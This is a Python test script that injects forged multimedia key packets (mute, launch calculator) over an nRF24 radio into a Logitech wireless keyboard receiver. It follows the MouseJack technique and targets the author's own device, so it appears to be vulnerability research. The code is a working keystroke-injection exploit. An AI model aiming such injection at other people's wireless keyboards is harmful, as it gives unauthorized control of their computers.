'''
Test for injection of multimedia keys, such as volume keys, application launch buttons (calculator, email), etc.
'''

import time
import sys
from os.path import dirname

sys.path.append(dirname(dirname(__file__)))
from radio_agent import nrf24
from utils.general_utils import *
from utils.hid_scan_codes import *

def main():
    address = [0xB4, 0xB8, 0xAE, 0xED, 0xE4] # RF address of a Logitech MK345 keyboard that I (Ron) own

    # initialize the radio
    radio = nrf24.nrf24()

    # find the frequency channel
    _ = find_address_channel(radio=radio, address=address)

    # transmitting payload that sets the keepalive timeout to 1200ms (=0x4B0)
    radio.transmit_payload(SET_KEEPALIVE_TIMEOUT_PAYLOAD)
    time.sleep(SLEEPING_PERIOD)

    # refer to Table 9 in the MouseJack whitepaper: Logitech Multimedia Key Payload
    radio.transmit_payload(with_checksum([0x00, 0xC3, KEY_FN_F9, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00])) # Mute
    time.sleep(SLEEPING_PERIOD)
    radio.transmit_payload(KEEPALIVE_PAYLOAD)

    # for codes more than one byte long, turns out it needs to be little endian
    radio.transmit_payload(with_checksum([0x00, 0xC3] + list(KEY_FN_F4.to_bytes(2, byteorder='little')) + [0x00, 0x00, 0x00, 0x00, 0x00])) # Launch calculator
    time.sleep(SLEEPING_PERIOD)
    radio.transmit_payload(KEEPALIVE_PAYLOAD)

    # key release packet (scan code = 0x00)
    radio.transmit_payload(KEY_RELEASE_PAYLOAD)

if __name__ == '__main__':
    main()
